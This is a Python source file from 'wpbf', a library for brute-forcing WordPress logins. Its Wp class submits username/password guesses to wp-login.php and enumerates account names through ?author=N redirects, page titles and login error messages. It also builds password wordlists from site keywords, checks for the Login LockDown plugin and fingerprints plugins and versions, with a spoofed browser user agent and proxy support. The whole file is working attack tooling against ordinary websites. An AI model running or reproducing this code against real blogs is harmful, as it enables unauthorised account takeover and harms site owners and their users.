"""
wpbf WordPress library

Copyright 2011 Andres Tarantini (atarantini@gmail.com)

This file is part of wpbf.

wpbf is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

wpbf is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with wpbf.  If not, see <http://www.gnu.org/licenses/>.
"""
import urllib, urllib2, re, logging
from random import randint
from urlparse import urlparse

def rm_duplicates(seq):
    """Remove duplicates from a list

    This Function have been made by Dave Kirby and taken from site http://www.peterbe.com/plog/uniqifiers-benchmark

    >>> rm_duplicates([1, 2, 3, 3, 4])
    [1, 2, 3, 4]
    """
    seen = set()
    return [x for x in seq if x not in seen and not seen.add(x)]

def filter_domain(domain):
    """ Strips TLD and ccTLD (ex: .com, .ar, etc) from a domain name

    >>> filter_domain("www.dominio.com.ar")
    'dominio'
    """
    words = [".com", "www.", ".ar", ".cl", ".py", ".org", ".net", ".mx", ".bo", ".gob", ".gov", ".edu"]
    for word in words:
        domain = domain.replace(word, "")
    return domain

def get_keywords(data, min_keyword_len=3, min_frequency=2):
    """Get relevant keywords from text

    data            -- Input text to be indexed
    min_keyword_len -- Filter keywords that doesn't have this minimum length
    min_frequency   -- Filter keywords by the number of times than a keyword appear
    """
    words = [w for w in data.split() if len(w) > min_keyword_len]
    keywords = {}
    for word in words:
        if word in keywords:
            keywords[word] += 1
        else:
            keywords[word] = 1

    for keyword, frequency in keywords.copy().iteritems():
        if frequency < min_frequency:
            del keywords[keyword]

    return [k for k, v in keywords.iteritems()]

class Wp:
    """Perform actions on a WordPress Blog.

    Do things in a WordPress blog including login, username check/enumeration, keyword search and plugin detection.

    base_url          -- URL of the blog's main page
    login_script_path -- Path relative to base_url where the login form is located
    proxy             -- URL for a HTTP Proxy
    """
    _base_url = ''
    _login_script_path = ''
    _login_url = ''
    _proxy = None
    _version = None
    _arguments = _keywords = []
    _cache = {}

    def __init__(self, base_url, login_script_path="wp-login.php", proxy=None, *arguments, **keywords):
        # Basic filters for the base url
        self._base_url = base_url
        if self._base_url[0:7] != 'http://':
            self._base_url = 'http://'+self._base_url
        if self._base_url[-1] != '/':
            self._base_url = self._base_url+'/'

        self._login_script_path = login_script_path.lstrip("/")
        self._proxy = proxy
        self._login_url = urllib.basejoin(self._base_url, self._login_script_path)
        self._arguments = arguments
        self._keywords = keywords

        self.logger = logging.getLogger("wpbf")

    # Getters

    def get_login_url(self):
        """Returns login URL"""
        return self._login_url

    def get_base_url(self):
        """Returns base URL"""
        return self._base_url

    def get_version(self):
        """Returns WordPress version"""
        return self._version

    # General methods

    def request(self, url, params=[], cache=False, data=True):
        """Request an URL with a given parameters and proxy

        url    -- URL to request
        params -- dictionary with POST variables
        cache  -- True if you want request to be cached and get a cached version of the request
        data   -- If false, return request object, else return data. Cached data must be retrived with data=True
        """
        if cache and data and self._cache.has_key(url) and len(params) is 0:
            self.logger.debug("Cached %s %s", url, params)
            return self._cache[url]

        request = urllib2.Request(url)
        request.add_header("User-agent", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1")
        if self._proxy:
            proxy_handler = urllib2.ProxyHandler({'http': self._proxy})
            opener = urllib2.build_opener(proxy_handler)
        else:
            opener = urllib2.build_opener()
        self.logger.debug("Requesting %s %s", url, params)
        try:
            response = opener.open(request, urllib.urlencode(params))
            response_data = response.read()
        except urllib2.HTTPError:
            return False

        if cache and data and len(params) is 0:
            self._cache[url] = response_data

        if data:
            return response_data

        return response


    # WordPress specific methods

    def login(self, username, password):
        """Try to login into WordPress and see in the returned data contains login errors

        username -- Wordpress username
        password -- Password for the supplied username
        """
        data = self.request(self._login_url, [('log', username), ('pwd', password)])
        if data:
            if "ERROR" in data or "Error" in data or "login_error" in data or "incorrect" in data.lower():
                return False
            return True
        return False

    def check_username(self, username):
        """Try to login into WordPress and check in the returned data contains username errors

        username -- Wordpress username
        """
        data = self.request(self._login_url, [('log', username), ('pwd', str(randint(1, 9999999)))])
        if data:
            if "ERROR" in data or "Error" in data or "login_error" in data:
                if "usuario es incorrecto" in data or 'usuario no' in data or "Invalid username" in data:
                    return False
                return True
        return False

    def find_username(self, url=False):
        """Try to find a suitable username searching for common strings used in templates that refers to authors of blog posts

        url   -- Any URL in the blog that can contain author references
        """
        if url:
            data =  self.request(url, cache=True)
        else:
            data =  self.request(self._base_url, cache=True)
        username = None

        regexps = [
            '/author/(.*)"',
            '/author/(.*?)/feed',
            'entries of (.*)"',
            'by (.*) Feed"',
            '(<!-- by (.*?) -->)',
            'View all posts by (.*)"',
        ]

        while username is None and len(regexps):
            regexp = regexps.pop()
            match = re.search(regexp, data, re.IGNORECASE)
            if match:
                username = match.group(1)
                # self.logger.debug("regexp %s marched %s", regexp, username) # uncoment to debug regexps

        if username:
            username = username.strip().replace("/","")
            self.logger.debug("Possible username %s (by content)", username)
            return username
        else:
            return False

    def enumerate_usernames(self, gap_tolerance=0):
        """Enumerate usernames

        Enumerate usernames using TALSOFT-2011-0526 advisory (http://seclists.org/fulldisclosure/2011/May/493) present in
        WordPress > 3.2-beta2, if no redirect is done try to match username from title of the user's archive page or page content.

        gap_tolerance -- Tolerance for user id gaps in the user id sequence (this gaps are present when users are deleted and new users created)
        """
        uid = 0
        usernames = []
        gaps = 0
        while gaps <= gap_tolerance:
            try:
                uid = uid + 1
                url = self._base_url+"?author="+str(uid)
                request = urllib2.Request(url)
                request.add_header("User-agent", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1")
                if self._proxy:
                    proxy_handler = urllib2.ProxyHandler({"http": self._proxy})
                    opener = urllib2.build_opener(proxy_handler)
                else:
                    opener = urllib2.build_opener()
                self.logger.debug("Requesting %s", url)
                response = opener.open(request)
                data = response.read()
                self._cache[url] = data     # save response in cache
                parsed_response_url = urlparse(response.geturl())
                response_path = parsed_response_url.path
                # Check for author in redirection
                if 'author' in response_path:
                    # A redirect was made and the username is exposed. The username is the last part of the
                    # response_path (sometimes the response path can contain a trailing slash)
                    if response_path[-1] is "/":
                        username = response_path.split("/")[-2]
                    else:
                        username = response_path.split("/")[-1]
                    self.logger.debug("Possible username %s (by redirect)", username)
                    usernames.append(username)
                    redirect = True
                    gaps = 0

                # Check for author in title
                username_title = self.get_user_from_title(data)
                if username_title and username_title not in usernames:
                    usernames.append(username_title)
                    gaps = 0

                # Check for author in content
                username_content = self.find_username(url)
                if username_content and username_content not in usernames:
                    usernames.append(username_content)
                    gaps = 0

            except urllib2.HTTPError, e:
                self.logger.debug(e)
                gaps += 1

            gaps += 1

        return [user for user in usernames if self.check_username(user)]

    def get_user_from_title(self, content):
        """Fetch the contents of the <title> tag and returns a username (usually, the first word)

        content    -- html content
        last_title -- last title found
        """
        # There was no redirection but the user ID seems to exists (because not 404) so we will
        # try to find the username as the first word in the title
        title_search = re.search("<title>(.*)</title>", content, re.IGNORECASE)
        if title_search:
            title =  title_search.group(1)
            # If the title is the same than the last title requested, or empty, there are no new users
            if (self._cache.has_key('title') and title == self._cache['title']) or ' ' not in title:
                return False
            else:
                self._cache['title'] = title
                username = title.split()[0]
                self.logger.debug("Possible username %s (by title)", username)
                return username
        else:
                return False

    def find_keywords_in_url(self, min_keyword_len=3, min_frequency=2, ignore_with=False):
        """Try to find relevant keywords within the given URL, keywords will be used in the password wordlist

        min_keyword_len -- Filter keywords that doesn't have this minimum length
        min_frequency   -- Filter keywords number of times than a keyword appears within the content
        ignore_with     -- Ignore words that contains any characters in this list
        """
        data =  self.request(self._base_url, cache=True)
        keywords = []

        # get keywords from title
        title = re.search('<title>(.*)</title>', data, re.IGNORECASE)
        if title:
            title = title.group(1)
            [keywords.insert(0, kw.lower()) for kw in title.split(" ")][:-1]

        # get keywords from url content
        [keywords.append(k.strip()) for k in get_keywords(re.sub("<.*?>", "", data), min_keyword_len, min_frequency)]

        # filter keywords
        keywords = rm_duplicates([k.lower().strip().strip(",").strip("?").strip('"') for k in keywords if len(k) > min_keyword_len])    # min leght
        if ignore_with and len(ignore_with) > 0:        # ignore keywords with certain characters
            for keyword in keywords[:]:
                for i in ignore_with:
                    if i in keyword:
                        keywords.remove(keyword)
                        break

        return keywords

    def check_loginlockdown(self):
        """Check if "Login LockDown" plugin is active (Alip Aswalid)

        url   -- Login form URL
        proxy -- URL for a HTTP Proxy
        """
        data = self.request(self._login_url, cache=True)
        if data and "lockdown" in data.lower():
            return True
        else:
            return False

    def check_plugin(self, plugin):
        """Try to fetch WordPress version from "generator" meta tag in main page

        return - WordPress version or false if not found
        """
        url = self._base_url+"wp-content/plugins/"+plugin
        data = self.request(url)
        if data is not False:
            return True
        else:
            return False

    def find_plugins(self, url=False):
        """Try to find plugin names from content

        url   -- Any URL in the blog that can contain plugin paths
        """
        if url:
            data =  self.request(url, cache=True)
        else:
            data =  self.request(self._base_url, cache=True)

        plugins = re.findall(r"wp-content/plugins/(.*)/.*\.*\?.*[\'|\"]\w", data, re.IGNORECASE)

        if len(plugins):
            self.logger.debug("Possible plugins %s present", plugins)
            return plugins
        else:
            return False

    def fingerprint(self):
        """Try to fetch WordPress version from "generator" meta tag in main page

        return - WordPress version or false if not found
        """
        data = self.request(self._base_url, cache=True)
        m = re.search('<meta name="generator" content="[Ww]ord[Pp]ress (\d\.\d\.?\d?)" />', data)
        if m:
            self._version = m.group(1)
            return self._version
        else:
            return False
